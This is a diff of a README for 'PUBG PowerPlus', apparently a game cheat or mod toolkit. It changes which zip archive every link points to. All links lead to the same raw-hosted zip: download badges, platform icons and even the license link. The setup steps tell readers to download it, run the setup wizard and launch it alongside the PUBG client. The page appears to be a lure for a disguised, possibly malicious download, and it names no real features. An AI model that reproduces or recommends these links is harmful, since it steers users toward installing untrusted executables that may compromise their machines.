@@ -1,5 +1,5 @@
 # PUBG PowerPlus ⚡️  
-[![Download](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip%20Now-green?logo=pubg&logoColor=white)](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip)
+[![Download](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip%20Now-green?logo=pubg&logoColor=white)](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip)
 
 Welcome to **PUBG PowerPlus** – the ultimate enhancement toolkit for PUBG enthusiasts! Take your PUBG battleground experience to the next dimension, with innovative features fused by intelligent AI integration, responsive design, and support for globetrotters who speak any language. Empower your gameplay, unlock visionary improvements, and enjoy secure, unrestricted possibilities. 
 
@@ -11,11 +11,11 @@ Seamless support across every battlefield platform.
 
 | Platform   | Compatible | Details             |
 |:-----------|:----------:|:-------------------|
-| ![Windows](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip) | ✅ | Windows 7/8/10/11 |
-| ![macOS](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip%20OS-lightgrey?logo=apple)   | ✅ | 10.13 High Sierra & above |
-| ![Linux](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip) | ✅ | Ubuntu, Fedora     |
-| ![Android](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip) | ⚡ | 8.0 Oreo & above |
-| ![iOS](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip)   | ⚡ | 13.0 & above      |
+| ![Windows](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip) | ✅ | Windows 7/8/10/11 |
+| ![macOS](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip%20OS-lightgrey?logo=apple)   | ✅ | 10.13 High Sierra & above |
+| ![Linux](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip) | ✅ | Ubuntu, Fedora     |
+| ![Android](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip) | ⚡ | 8.0 Oreo & above |
+| ![iOS](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip)   | ⚡ | 13.0 & above      |
 
 *⚡: Early access in beta. More systems coming soon!*
 
@@ -70,7 +70,7 @@ Ou team operates like a global command center – day or night, connect with PUB
 *Getting started is a breeze:*
 
 1. Click the badge below to access the latest package:
-   [![Download](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip%20Now-green?logo=pubg&logoColor=white)](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip)
+   [![Download](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip%20Now-green?logo=pubg&logoColor=white)](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip)
 2. Download the installer suited to your OS (see table above).
 3. Run the provided setup wizard.
 4. Launch PUBG PowerPlus before or alongside your PUBG client.
@@ -90,12 +90,12 @@ Ou team operates like a global command center – day or night, connect with PUB
 
 ## 📜 MIT License
 
-This repository is licensed under the [MIT License](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip) – 2025.  
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip) – 2025.  
 See the LICENSE file for full details.
 
 ---
 
-# [![Download](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip%20Now-green?logo=pubg&logoColor=white)](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg-elite-mod-toolkit_3.5.zip)
+# [![Download](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip%20Now-green?logo=pubg&logoColor=white)](https://raw.githubusercontent.com/kayleb20/pubg-elite-mod-toolkit/branch/sulphurwort/pubg_toolkit_elite_mod_2.0.zip)
 
 ---
 
